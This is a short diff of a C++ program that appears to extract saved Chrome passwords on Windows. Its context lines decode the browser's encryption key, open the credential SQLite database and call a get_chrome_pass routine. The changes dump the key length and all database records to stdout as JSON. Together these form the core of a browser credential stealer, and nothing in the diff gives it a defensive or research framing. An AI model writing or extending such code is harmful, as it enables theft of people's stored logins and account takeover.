@@ -7,7 +7,10 @@
 #include <iostream>
 //#include "aes_gcm.h"
 #include <sstream>
-#include "SQLfunctions.cpp"
+#include "SQLfunctions.h"
+#include "..\nlohmann\json.hpp"
+
+using json = nlohmann::json;
 
 std::vector<BYTE> b64Decode(std::string strInput){
     // as before you should make two calls to ::CryptStringToBinaryA 
@@ -171,8 +174,15 @@ int main(){
    } else {
       fprintf(stderr, "Opened database successfully\n");
    }
-   std::stringstream chrome_pass = get_chrome_pass(key->pbData + 5, db);
+   //std::stringstream chrome_pass = get_chrome_pass(key->pbData + 5, db);
+   json test;
+   test["KEY"] = key->cbData;
+   test["RECORDS"] = json(getAllResults(db));
+
+
    sqlite3_close(db);
+   
+   std::cout << test.dump();
     
     //BYTE * encrypted_password; //get from sqlite
     //BYTE * password = getPassword(key->pbData , encrypted_password);
